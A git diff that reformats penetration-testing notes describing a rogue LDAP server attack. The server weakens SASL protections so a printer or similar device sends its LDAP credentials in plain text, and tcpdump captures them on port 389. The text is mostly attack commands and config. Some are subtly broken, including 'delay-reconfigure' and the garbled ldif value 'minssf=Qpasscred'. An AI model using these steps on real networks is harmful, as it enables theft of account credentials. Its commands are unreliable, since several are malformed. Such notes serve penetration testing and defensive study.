@@ -21,48 +21,72 @@ In case a printer (or something similar) has an LDAP account, but use the SASL a
 
 #### Host a rogue LDAP server:
 
-#### sudo systemctl enable slapd
+#### 
 
-#### sudo delay-reconfigure -p low slapd
+    sudo systemctl enable slapd
 
-#### 1: No
+#### 
 
-#### 2: Enter target domain
+    sudo delay-reconfigure -p low slapd
 
-#### 3: Organization name
+#### 1: 
 
-#### 4: Any admin password
+    No
 
-#### 5: Set MDB as the LDAP database
+#### 2: 
 
-#### 6: No 
+    Enter target domain
 
-#### 7: Yes
+#### 3: 
+
+    Organization name
+
+#### 4: 
+
+    Any admin password
+
+#### 5: 
+
+    Set MDB as the LDAP database
+
+#### 6: 
+
+    No 
+
+#### 7: 
+
+    Yes
 
 #### 8: Create new ldif file
 
 ### Example: 
 
-##### #dcSaslSecProps.ldif
+     #dcSaslSecProps.ldif
 
-##### dn: cn=config
+     dn: cn=config
 
-##### replace:olcSaslSecProps
+    replace:olcSaslSecProps
 
-##### olcSaslSecProps: noanonymous,minssf=Qpasscred
+     olcSaslSecProps: noanonymous,minssf=Qpasscred
 
-#### minssf = No protection
+     minssf = (No protection)
 
-#### noanonymous = Disables anonymous login
+     noanonymous = (Disables anonymous login)
 
-#### olcSaslSecProps = Specifies the SASL security properties
+     olcSaslSecProps = (Specifies the SASL security properties)
 
-#### 9: sudo ldapmodify -Y EXTERNAL -H ldap:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+#### 9: 
 
-#### 10: Verify with: ldapsearch -H ldap:// -x -LLL -s base -b " " supportedSASLmechanisms)
+    sudo ldapmodify -Y EXTERNAL -H ldap:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+
+#### 10: Verify with: 
+
+    ldapsearch -H ldap:// -x -LLL -s base -b " " supportedSASLmechanisms)
 
 #### 11: Capture LDAP credentials
 
-#### sudo tcpdump -SX -i TARGET_INTERFACE tcp port 389
+#### 
+
+    sudo tcpdump -SX -i TARGET_INTERFACE tcp port 389
 
 ### We should get credentials in plain text.
